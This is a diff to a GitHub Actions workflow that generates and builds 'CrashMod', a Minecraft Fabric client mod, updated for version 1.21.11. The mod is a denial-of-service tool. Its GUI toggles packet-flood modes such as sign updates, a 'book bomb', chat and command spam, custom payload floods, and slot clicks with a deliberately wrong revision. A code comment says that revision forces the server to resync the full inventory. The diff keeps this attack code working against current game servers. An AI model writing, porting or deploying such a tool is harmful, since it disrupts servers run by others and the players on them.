@@ -54,7 +54,7 @@ jobs:
           org.gradle.jvmargs=-Xmx2G
           org.gradle.parallel=true
           minecraft_version=1.21.11
-          yarn_mappings=1.21.11+build.1
+          yarn_mappings=1.21.11+build.3
           loader_version=0.17.2
           fabric_version=0.141.6+1.21.11
           minecraft_range=~1.21
@@ -85,7 +85,7 @@ jobs:
           }
 
           def mcVersion     = (findProperty('minecraft_version') ?: '1.21.11').toString()
-          def yarnVersion   = (findProperty('yarn_mappings')     ?: "${mcVersion}+build.1").toString()
+          def yarnVersion   = (findProperty('yarn_mappings')     ?: "${mcVersion}+build.3").toString()
           def loaderVersion = (findProperty('loader_version')    ?: '0.17.2').toString()
           def fabricVersion = (findProperty('fabric_version')    ?: "0.141.6+${mcVersion}").toString()
           def mcRange       = (findProperty('minecraft_range')   ?: '~1.21').toString()
@@ -152,10 +152,10 @@ jobs:
           fi
 
           [ -f src/main/resources/assets/crashmod/lang/vi_vn.json ] || \
-            printf '{ "key.crashmod.open": "Mo GUI CrashMod", "category.crashmod": "CrashMod" }\n' \
+            printf '{ "key.crashmod.open": "Mo GUI CrashMod", "key.crashmod.main": "CrashMod", "key.categories.crashmod.main": "CrashMod", "key.category.crashmod.main": "CrashMod", "key.crashmod.category.main": "CrashMod" }\n' \
               > src/main/resources/assets/crashmod/lang/vi_vn.json
           [ -f src/main/resources/assets/crashmod/lang/en_us.json ] || \
-            printf '{ "key.crashmod.open": "Open CrashMod GUI", "category.crashmod": "CrashMod" }\n' \
+            printf '{ "key.crashmod.open": "Open CrashMod GUI", "key.crashmod.main": "CrashMod", "key.categories.crashmod.main": "CrashMod", "key.category.crashmod.main": "CrashMod", "key.crashmod.category.main": "CrashMod" }\n' \
               > src/main/resources/assets/crashmod/lang/en_us.json
 
           [ -f .gitignore ] || printf '.gradle/\nbuild/\nrun/\nout/\n.idea/\n*.iml\n.vscode/\n' > .gitignore
@@ -171,13 +171,16 @@ jobs:
           package vn.venice.crashmod;
 
           import net.fabricmc.api.ModInitializer;
+          import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
           import org.slf4j.Logger;
           import org.slf4j.LoggerFactory;
+          import vn.venice.crashmod.net.FloodPayload;
 
           public class CrashMod implements ModInitializer {
               public static final Logger LOGGER = LoggerFactory.getLogger("CrashMod");
               @Override
               public void onInitialize() {
+                  PayloadTypeRegistry.playC2S().register(FloodPayload.ID, FloodPayload.CODEC);
                   LOGGER.info("[CrashMod] da nap");
               }
           }
@@ -207,7 +210,7 @@ jobs:
                       new Mode("look",       "Look",        2),
                       new Mode("move",       "Move",        3),
                       new Mode("abilities",  "Abilities",   4),
-                      new Mode("shift",      "Shift",       5),
+                      new Mode("input",      "Input/Sneak", 5),
                       new Mode("sprint",     "Sprint",      6),
                       new Mode("close_gui",  "Dong GUI",    7),
                       new Mode("slot",       "Doi slot",    8),
@@ -370,14 +373,16 @@ jobs:
           import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
           import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
           import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
+          import net.minecraft.network.packet.c2s.play.PlayerInputC2SPacket;
           import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
           import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
           import net.minecraft.network.packet.c2s.play.UpdatePlayerAbilitiesC2SPacket;
           import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
           import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
           import net.minecraft.screen.slot.SlotActionType;
-          import net.minecraft.text.Text;
+          import net.minecraft.screen.sync.ItemStackHash;
           import net.minecraft.util.Hand;
+          import net.minecraft.util.PlayerInput;
           import net.minecraft.util.math.BlockPos;
           import net.minecraft.util.math.Direction;
           import vn.venice.crashmod.net.FloodPayload;
@@ -435,8 +440,10 @@ jobs:
                       case 4 -> p.networkHandler.sendPacket(
                               new UpdatePlayerAbilitiesC2SPacket(p.getAbilities()));
 
-                      case 5 -> p.networkHandler.sendPacket(new ClientCommandC2SPacket(
-                              p, ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
+                      // 1.21.6+ : press/release shift di qua PlayerInputC2SPacket
+                      // (ClientCommandC2SPacket.Mode khong con PRESS_SHIFT_KEY nua)
+                      case 5 -> p.networkHandler.sendPacket(new PlayerInputC2SPacket(
+                              new PlayerInput(false, false, false, false, false, tx % 2 == 0, false)));
 
                       case 6 -> p.networkHandler.sendPacket(new ClientCommandC2SPacket(
                               p, ClientCommandC2SPacket.Mode.START_SPRINTING));
@@ -451,7 +458,8 @@ jobs:
 
                       case 10 -> p.networkHandler.sendChatMessage("CrashMod " + tx);
 
-                      case 11 -> p.networkHandler.sendCommand("crashmod" + tx);
+                      // 1.21.9+ : sendCommand() -> sendChatCommand()
+                      case 11 -> p.networkHandler.sendChatCommand("crashmod" + tx);
 
                       case 12 -> p.networkHandler.sendPacket(
                               new CustomPayloadC2SPacket(FloodPayload.INSTANCE));
@@ -471,9 +479,9 @@ jobs:
 
                       case 19 -> {
                           BlockPos pos = BlockPos.ofFloored(p.getX(), p.getY(), p.getZ());
-                          // <= 1.21.8 neu loi compile: doi thanh (pos, true, L, L, L, L)
+                          // 1.21.9+ : 4 String roi, khong con String[]
                           p.networkHandler.sendPacket(new UpdateSignC2SPacket(
-                                  pos, true, new String[]{SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE}));
+                                  pos, true, SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE));
                       }
 
                       // ---------------- CHUNK ----------------
@@ -508,18 +516,23 @@ jobs:
               }
 
               private static void click(ClientPlayerEntity p) {
+                  // 1.21.9+ : (int syncId, int revision, short slot, byte button,
+                  //            SlotActionType, Int2ObjectMap<ItemStackHash>, ItemStackHash)
+                  // revision = tx  -> gui revision sai -> server buoc phai syncState() full inventory
                   p.networkHandler.sendPacket(new ClickSlotC2SPacket(
                           p.currentScreenHandler.syncId,
-                          0,
-                          0, 0,
+                          tx,
+                          (short) 0,
+                          (byte) 0,
                           SlotActionType.PICKUP,
-                          ItemStack.EMPTY,
-                          new Int2ObjectArrayMap<>()));
+                          new Int2ObjectArrayMap<ItemStackHash>(),
+                          ItemStackHash.EMPTY));
               }
 
               private static void book(ClientPlayerEntity p, List<String> pages) {
+                  // 1.21.9+ : title la Optional<String>
                   p.networkHandler.sendPacket(new BookUpdateC2SPacket(
-                          sel(p), pages, Optional.<Text>empty()));
+                          sel(p), pages, Optional.empty()));
               }
           }
           EOF
@@ -535,6 +548,7 @@ jobs:
           import net.minecraft.client.MinecraftClient;
           import net.minecraft.client.option.KeyBinding;
           import net.minecraft.client.util.InputUtil;
+          import net.minecraft.util.Identifier;
           import org.lwjgl.glfw.GLFW;
           import vn.venice.crashmod.Config;
 
@@ -542,13 +556,17 @@ jobs:
 
               public static KeyBinding openKey;
 
+              // 1.21.9+ : KeyBinding can KeyBinding.Category, khong nhan String nua
+              private static final KeyBinding.Category CATEGORY =
+                      KeyBinding.Category.create(Identifier.of("crashmod", "main"));
+
               @Override
               public void onInitializeClient() {
                   Config.load();
 
                   openKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
                           "key.crashmod.open", InputUtil.Type.KEYSYM,
-                          GLFW.GLFW_KEY_M, "category.crashmod"));
+                          GLFW.GLFW_KEY_M, CATEGORY));
 
                   ClientTickEvents.END_CLIENT_TICK.register(client -> {
                       while (openKey.wasPressed()) {
@@ -598,26 +616,30 @@ jobs:
                           : "\u00a78[ ] \u00a77" + m.label());
               }
 
+              /** 1.21.9+ : TextWidget khong con alignCenter() -> tu canh giua */
+              private void header(Text text, int y, int centerX, MinecraftClient mc) {
+                  int w = mc.textRenderer.getWidth(text);
+                  addDrawableChild(new TextWidget(centerX - w / 2, y, w, 10, text, mc.textRenderer));
+              }
+
               @Override
               protected void init() {
                   int cols = 3, colW = 112, h = 18, gapX = 6, gapY = 2;
                   int totalW = cols * colW + (cols - 1) * gapX;
                   int startX = this.width / 2 - totalW / 2;
+                  int centerX = this.width / 2;
 
                   MinecraftClient mc = MinecraftClient.getInstance();
                   boolean hasBook = mc.player != null && Packets.holdingBook(mc.player);
 
-                  addDrawableChild(new TextWidget(startX, 6, totalW, 10,
-                          Text.literal("\u00a77Shift+M  \u00a78|  \u00a7abat: \u00a7f"
-                                  + Config.enabled.size() + "  \u00a78|  \u00a7arate: \u00a7f"
-                                  + Config.rate() + " pkt/tick"),
-                          mc.textRenderer).alignCenter());
+                  header(Text.literal("\u00a77Shift+M  \u00a78|  \u00a7abat: \u00a7f"
+                          + Config.enabled.size() + "  \u00a78|  \u00a7arate: \u00a7f"
+                          + Config.rate() + " pkt/tick"), 6, centerX, mc);
 
-                  addDrawableChild(new TextWidget(startX, 16, totalW, 10,
-                          Text.literal(hasBook
-                                  ? "\u00a7asach tren tay: CO  \u00a78(book bomb san sang)"
-                                  : "\u00a7csach tren tay: KHONG  \u00a78(cam sach+but de dung book bomb)"),
-                          mc.textRenderer).alignCenter());
+                  header(Text.literal(hasBook
+                          ? "\u00a7asach tren tay: CO  \u00a78(book bomb san sang)"
+                          : "\u00a7csach tren tay: KHONG  \u00a78(cam sach+but de dung book bomb)"),
+                          16, centerX, mc);
 
                   int i = 0;
                   for (CrashRegistry.Mode m : CrashRegistry.MODES) {
@@ -698,7 +720,7 @@ jobs:
       fail-fast: false
       matrix:
         include:
-          - { mc: '1.21.11', yarn: '1.21.11+build.1', fabric: '0.141.6+1.21.11' }
+          - { mc: '1.21.11', yarn: '1.21.11+build.3', fabric: '0.141.6+1.21.11' }
     steps:
       - uses: actions/checkout@v4
 
@@ -735,6 +757,7 @@ jobs:
                   "vn/venice/crashmod/CrashMod.class",
                   "vn/venice/crashmod/Config.class",
                   "vn/venice/crashmod/CrashRegistry.class",
+                  "vn/venice/crashmod/net/FloodPayload.class",
                   "vn/venice/crashmod/client/CrashModClient.class",
                   "vn/venice/crashmod/client/Packets.class",
                   "vn/venice/crashmod/client/ToggleScreen.class"]
